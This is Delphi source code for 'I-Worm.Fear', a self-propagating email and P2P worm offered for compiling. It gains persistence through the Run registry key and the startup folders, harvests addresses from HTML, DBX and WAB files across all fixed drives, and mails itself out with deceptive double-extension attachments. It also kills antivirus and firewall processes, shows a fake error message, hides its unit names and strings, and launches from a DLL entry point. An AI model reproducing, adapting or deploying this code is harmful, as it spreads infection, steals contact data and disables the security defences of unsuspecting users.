   //******************************************************************************
   //**                             I-Worm.Fear                                  **
   //******************************************************************************
   //**           Please use "make.bat" If you want to compille it!!!            **
   //******************************************************************************
   //** - Infect LAN                                                             **
   //** - SMTP Engine                                                            **
   //** - Kill AV/FW                                                             **
   //** - Infect P2P (Kazaa, Edonkey, Morpheus, ...)                             **
   //** - Read Email Addresses From *.htm, *.html, *.dbx, *.wab                  **
   //** - Firewall Bypass                                                        **
   //** - Do not appar in task managger under 95/98/NT/2K/XP                     **
   //** - Encrypted Strings in EXE (Very Easy Encryption)                        **
   //** - Change EXE Size on P2P Network                                         **
   //******************************************************************************

   {$I CompMode.INI}

   LIBRARY Fear_DLL;

   {$IFDEF Debug}
   USES
     AclUtils in 'ACLUnits\ACLUTILS.PAS',
     sClasses in 'ACLUnits\SCLASSES.PAS',
     Registry in 'ACLUnits\REGISTRY.PAS',
     P2P in 'P2P.PAS',
     LAN in 'LAN.PAS',
     Utils in 'UTILS.PAS',
     Email in 'EMAIL.PAS',                                                         //Send Email + SMTP Engine
     KillAV in 'KILLAV.PAS',                                                       //Kill firewalls and antiviruses
     GetProc in 'GETPROC.PAS',                                                     //Get the address of DLL functions
     MXLookup in 'MXLookup.PAS',                                                   //Search the real address of SMTP server
     ExtractDBX in 'ExtractDBX.PAS',                                               //Extract emails from outlook .dbx file
     Windows;
   {$ELSE}
   USES
   //Delphi put original name of units into the end of .exe file. I do not want to
   //display KillAV, P2P, Email, etc strings at the end of the generated file,
   //therefore I rename the units before compille.
     B1 in 'ACLUnits\B1.PAS',                                                      {ACLUTILS}
     B2 in 'ACLUnits\B2.PAS',                                                      {SCLASSES}
     B3 in 'ACLUnits\B3.PAS',                                                      {REGISTRY}
     A8 in 'TEMP\A8.PAS',                                                          {P2P}
     A7 in 'TEMP\A7.PAS',                                                          {LAN}
     A6 in 'TEMP\A6.PAS',                                                          {Utils}
     A1 in 'TEMP\A1.PAS',                                                          {Email}
     A5 in 'TEMP\A5.PAS',                                                          {KillAV}
     A3 in 'TEMP\A3.PAS',                                                          {GetProc}
     A4 in 'TEMP\A4.PAS',                                                          {MXLookup}
     A2 in 'TEMP\A2.PAS',                                                          {ExtractDBX}
     Windows;
   {$ENDIF}

   VAR
     Msg                   : TMsg;
     SendMailBusy          : BOOL = False;
     WABExists             : BOOL = False;
     SentEmail             : WORD = 1;
     NumberOfExtensions1   : WORD;
     NumberOfExtensions2   : WORD;
     NumberOfBodys         : WORD;
     NumberOfErrorMessages : WORD;
     NumberOfAttachments   : WORD;
     NumberOfSubjects      : WORD;
     FearRegKey            : STRING;
     Extensions1           : XArray;                                               //XArray include the decoded strings
     Extensions2           : XArray;
     Bodys                 : XArray;
     ErrorMessages         : XArray;
     Attachments           : XArray;
     Subjects              : XArray;

   CONST
     KILL_AV_INTERVALL     = 04000; // (= 10 sec) [milisec]
     SEND_EMAIL_INTERVALL  = 10000; // (= 10 sec) [milisec]

   {$I RESOURCES\TBODYS.INI}
   {$I RESOURCES\TSUBJECTS.INI}
   {$I RESOURCES\TEXTENSIONS1.INI}
   {$I RESOURCES\TEXTENSIONS2.INI}
   {$I RESOURCES\TATTACHMENTS.INI}
   {$I RESOURCES\TERRORMESSAGES.INI}

   FUNCTION RandomFileName : STRING;                                               //Generate 5-15 caracter long random file name
   VAR
     I : BYTE;
   BEGIN
     FOR I:=1 TO Random(10)+5 DO RESULT:=RESULT+Chars[Random(61)+1];
     RESULT:=RESULT+MainStr[5];                                                    //".exe"
   END;

   PROCEDURE InfectStartUpDir;
   VAR
     I : BYTE;
     S : STRING;
   BEGIN
     FOR I:=0 TO 1 DO BEGIN
       Reg.RootKey:=HKEY_CURRENT_USER+1;
       Reg.OpenKey(MainStr[47]+MainStr[29],True);                                  //"Windows\CurrentVersion\explorer\Shell Folders"
       IF Reg.KeyExists(MainStr[27+I*3]) THEN BEGIN
         S:=Reg.ReadString(MainStr[27+I*3])+'\';                                   //"Startup","Common Startup"
         IF S<>'' THEN CopyFiles(True,S+RandomFileName);
       END;
       Reg.CloseKey;
     END;
   END;

   PROCEDURE SetFearRegKey;                                                        //Register a random file into registry
   VAR
     I : BYTE;
     S : STRING;
     X : STRING;
   BEGIN
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     Reg.OpenKey(MainStr[47]+MainStr[35],True);                                    //"Windows\CurrentVersion\Run"
     S:=AVName[Random(NumberOfAVNames-1)+1];
     I:=Pos('.',S);
     IF I>0 THEN SetLength(S,I-1);
     X:=WinPath+RandomFileName;
     Reg.WriteString(S,X);
     Reg.CloseKey;
     CopyFiles(True,X);
   END;

   PROCEDURE QuickSort(Left,Right:WORD);
   VAR
     Up,Down : WORD;
     Compare : STRING;
   BEGIN
     Up:=Left;Down:=Right;Compare:=Emails.Strings[(Left+Right) DIV 2];
     REPEAT
       WHILE Emails.Strings[Up]<Compare DO Inc(Up);
       WHILE Compare<Emails.Strings[Down] DO Dec(Down);
       IF Up<=Down THEN BEGIN
         Emails.Exchange(Up,Down);
         Inc(Up);Dec(Down);
       END;
     UNTIL Up>Down;
     IF Left<Down THEN QuickSort(Left,Down);
     IF Up<Right  THEN QuickSort(Up,Right);
   END;

   FUNCTION GetFearRegKey : STRING;
   VAR
     I    : WORD;
     O    : WORD;
     Keys : TStrings;
   BEGIN
     Keys:=TStringList.Create;
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     Reg.OpenKey(MainStr[39],False);                                               //"\SOFTWARE"
     Reg.GetKeyNames(Keys);
     FOR I:=0 TO Keys.Count-1 DO
       FOR O:=1 TO NumberOfAVNames DO
         IF Pos(Keys.Strings[I],AVName[O])=1 THEN BEGIN
           Reg.OpenKey(MainStr[46]+Keys.Strings[I],False);                         //"\SOFTWARE\"
           IF(Reg.ValueExists(MainStr[38]))AND(Reg.ValueExists(MainStr[37])) THEN BEGIN //"Sent","email_num"
             RESULT:=Keys.Strings[I];
             Break;
           END;
         END;
     IF RESULT='' THEN BEGIN
       RESULT:=AVName[Random(NumberOfAVNames-1)+1];
       I:=POS('.',RESULT);
       IF I>0 THEN SetLength(RESULT,I-1);
     END;
     Keys.Free;
     Reg.CloseKey;
   END;

   PROCEDURE ReadWAB;
   VAR
     F       : FILE;
     I       : DWORD;
     S       : STRING;
     N       : ARRAY[1..5] OF Char;
     Buf     : ARRAY[1..500] OF Char;
     WABPath : STRING;
   BEGIN
     Reg.RootKey:=HKEY_CURRENT_USER;
     Reg.OpenKey(MainStr[47]+MainStr[36],False);                                   //"WAB\WAB4\WAB File Name"
     WABPath:=Reg.ReadString('');
     AssignFile(F,WABPath);
     IF(WABPath<>'')AND(FileExists(WABPath)) THEN BEGIN
       WABExists:=True;
       Reset(F,1);
       Seek(F,176199);
       REPEAT
         BlockRead(F,N,5);
         IF N[1]+N[2]+N[3]+N[4]=#01#31#00#03 THEN BEGIN
           BlockRead(F,Buf,Ord(N[5])+30);
           S:='';
           FOR I:=1 TO Ord(N[5])+30 DO S:=S+Buf[I];
           Delete(S,1,3);
           I:=Pos(#00#00#00,S);
           IF I>0 THEN Delete(S,I,Length(S)-I+1);
           FOR I:=1 TO Ord(N[5]) DO IF S[I]=#00 THEN Delete(S,I,1);
           IF (Pos('@',S)>0)AND(S[1]<>'/') THEN Emails.ADD(UpperCase(S));
         END ELSE Seek(F,FilePos(F)-4);
       UNTIL FileSize(F)-FilePos(F)<6;
       CloseFile(F);
       IF Emails.Count>2 THEN QuickSort(1,Emails.Count-1);
       FOR I:=Emails.Count-2 DOWNTO 1 DO IF Emails.Strings[I]=Emails.Strings[I+1] THEN Emails.Delete(I);
     END;
     IF NOT FileExists(WABPath) THEN WABExists:=False;
     Reg.CloseKey;
   END;

   PROCEDURE WriteEmailsReg;
   VAR
     I : DWORD;
   BEGIN
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     Reg.OpenKey(MainStr[46]+FearRegKey,True);
     IF Emails.Count>0 THEN FOR I:=0 TO Emails.Count-1 DO Reg.WriteString(IntToStr(I),Emails.Strings[I]);
     Reg.WriteInteger(MainStr[37],Emails.Count);                                   //"email_num"
     Reg.WriteInteger(MainStr[38],SentEmail);                                      //"sent"
     Reg.CloseKey;
   END;

   PROCEDURE ReadEmailsReg;
   VAR
     I : DWORD;
     J : DWORD;
   BEGIN
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     IF Reg.OpenKey(MainStr[46]+FearRegKey,False) THEN BEGIN
       IF Reg.KeyExists(MainStr[38]) THEN SentEmail:=Reg.ReadInteger(MainStr[38]); //"sent"
       J:=Reg.ReadInteger(MainStr[37]);                                            //"email_num"
       IF J>0 THEN FOR I:=0 TO J-1 DO Emails.Add(Reg.ReadString(IntToStr(I)));
     END;
     Reg.CloseKey;
   END;

   FUNCTION GetFirstRun : BOOL;
   BEGIN
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     Reg.OpenKey(MainStr[39],False);                                               //"\Software"
     RESULT:=NOT Reg.KeyExists(FearRegKey);
     Reg.CreateKey(FearRegKey);
     Reg.CloseKey;
   END;

   PROCEDURE SendMail;
   BEGIN
     IF(InternetGetConnectedState(NIL,0))AND(Emails.Count>1)AND(SendMailBusy=False) THEN BEGIN
       SendMailBusy:=True;
       IF SentEmail>Emails.Count-1 THEN SentEmail:=1;
       Reg.RootKey:=HKEY_LOCAL_MACHINE;
       Reg.OpenKey(MainStr[46]+FearRegKey,True);
       Reg.WriteInteger(MainStr[38],SentEmail);                                    //"Sent"
       Reg.CloseKey;
       TRY
       SendEmail(Subjects[Random(NumberOfSubjects-1)+1],Bodys[Random(NumberOfBodys-1)+1],Emails[SentEmail],WinPath,Attachments[Random(NumberOfAttachments-1)+1]+'.'+Extensions1[Random(NumberOfExtensions1-1)+1]+'.'+Extensions2[Random(NumberOfExtensions2-1)+1]);
       Inc(SentEmail);
       EXCEPT
       END;
       SendMailBusy:=False;
     END;
   END;

   PROCEDURE ClearEmail(S:STRING);
   VAR
     I : WORD;
     C : Char;
   BEGIN
     FOR I:=Pos('@',S)+1 TO Length(S) DO
       IF ((S[I]<'a')OR(S[I]>'z'))AND((S[I]<'0')OR(S[I]>'9'))AND((S[I]<'A')OR(S[I]>'Z'))AND(S[I]<>'.')AND(S[I]<>'-')AND(S[I]<>'_') THEN BEGIN
         SetLength(S,I-1);
         Break;
       END;
     IF Length(S)>0 THEN BEGIN
       C:=S[1];
       IF (C IN ['A','Z'])OR(C IN ['a','z']) THEN
       IF (Pos('@',S)>0)AND(Pos('?',S)=0)AND(Pos('%',S)=0)AND(Pos('$',S)=0)AND(Pos(':',S)=0)AND(Pos(' ',S)=0) THEN Emails.Add(S);
     END;
   END;

   PROCEDURE FindEmail(EFile:AnsiString);                                          //Search email address in html files
   VAR
     F : TextFile;
     I : WORD;
   BEGIN
     IF FileExists(EFile) THEN BEGIN
       AssignFile(F,EFile);
       Reset(F);
       REPEAT
         ReadLn(F,EFile);
         EFile:=UpperCase(EFile);
         I:=Pos('LTO:',EFile);
         IF I>0 THEN BEGIN
           Delete(EFile,1,I+3);
           I:=Pos('"',EFile);
           IF I>0 THEN Delete(EFile,I,Length(EFile));
           ClearEmail(EFile);
         END;
       UNTIL EOF(F);
       CloseFile(F);
     END;
   END;

   PROCEDURE SearchInDir(Path:AnsiString);
   VAR
     D     : TSearchRec;
     Error : Integer;
   BEGIN
     Error:=FindFirst(Path+'*.'+MainStr[106],faAnyFile OR faHidden,D);
     WHILE Error=0 DO BEGIN
       ExtrackEmailFromDBX(Path+D.Name);
       Error:=FindNext(D);
     END;
     Error:=FindFirst(Path+'*.'+MainStr[107],faAnyFile OR faHidden,D);
     WHILE Error=0 DO BEGIN
       FindEmail(Path+D.Name);
       Error:=FindNext(D);
     END;
     Error:=FindFirst(Path+'*.'+MainStr[108],faAnyFile OR faHidden,D);
     WHILE Error=0 DO BEGIN
       FindEmail(Path+D.Name);
       Error:=FindNext(D);
     END;
     Error:=FindFirst(Path+'*.*',faDirectory OR faHidden,D);
     WHILE Error=0 DO BEGIN
       IF (D.Attr AND faDirectory>0)AND(D.Name[1]<>'.') THEN begin SearchInDir(Path+D.Name+'\');end;
       Error:=FindNext(D);
     END;
   END;

   PROCEDURE SearchAllDir;
   VAR
     I : BYTE;
   BEGIN
     FOR I:=Ord('c') TO Ord('z') DO IF GetDriveType(pChar(Chr(I)+':\'))=DRIVE_FIXED THEN SearchInDir(Chr(I)+':\');
   END;

   PROCEDURE DelRegedit;
   BEGIN
     IF FileExists(WinPath+MainStr[44]) THEN DeleteFile(pChar(WinPath+MainStr[44]));  //"regedit.exe"
   END;

   PROCEDURE InitTimers;
   BEGIN
     SetTimer(0,1,SEND_EMAIL_INTERVALL,@SendMail);
     SetTimer(0,2,KILL_AV_INTERVALL,@AVKiller);
   END;

   PROCEDURE StartWorm;
   VAR
     FirstRun : BOOL;
   BEGIN
     InitEmailProcesses;
     NumberOfExtensions1:=DecodeStrings(TExtensions1,Extensions1);
     NumberOfExtensions2:=DecodeStrings(TExtensions2,Extensions2);
     NumberOfBodys:=DecodeStrings(TBodys,Bodys);
     NumberOfErrorMessages:=DecodeStrings(TErrorMessages,ErrorMessages);
     NumberOfAttachments:=DecodeStrings(TAttachments,Attachments);
     NumberOfSubjects:=DecodeStrings(TSubjects,Subjects);
     NumberOfAVNames:=DecodeStrings(TAVName,AVName);
     SetWinPath;
     StartEXEName:=WinPath+MainStr[105];                                           //"svchost.exe"
     IF NOT FileExists(StartEXEName) THEN Halt;
   //  DelRegedit;
     Randomize;
     Reg:=TRegistry.Create;
     FearRegKey:=GetFearRegKey;
     Emails:=TStringList.Create;
     Emails.Add('X');
     AVKiller;
     FirstRun:=GetFirstRun;
     IF (FirstRun)AND(Pos(MainStr[64],UpperCase(StartEXEName))=0) THEN MessageBox(0,pChar(ErrorMessages[Random(NumberOfErrorMessages-1)+1]),'Error',MB_ICONHAND); //"Startup"
     InitPeerToPeer;
     InfectStartUpDir;
     IF FirstRun THEN BEGIN
       SetFearRegKey;
       SearchAllDir;
       ReadWab;
       WriteEmailsReg;
     END ELSE BEGIN
       ReadEmailsReg;
       InitTimers;
     END;
     BeginThread(NIL,0,@RunThread,NIL,0,ThreadId);
   END;

   PROCEDURE Main;
   BEGIN
     DecodeAllStrings;                                                             //Decode The Main Strings
     InitProcesses;
     StartWorm;
     WHILE GetMessage(Msg,0,0,0) DO DispatchMessage(Msg);
   END;

   PROCEDURE EntryPoint(Reason:DWORD); STDCALL;
   BEGIN
     IF Reason=1 THEN CreateThread(NIL,0,TFNThreadStartRoutine(@Main),NIL,0,ThreadID);
   END;

   BEGIN
     DLLProc:=@EntryPoint;
     EntryPoint(1);
   END.
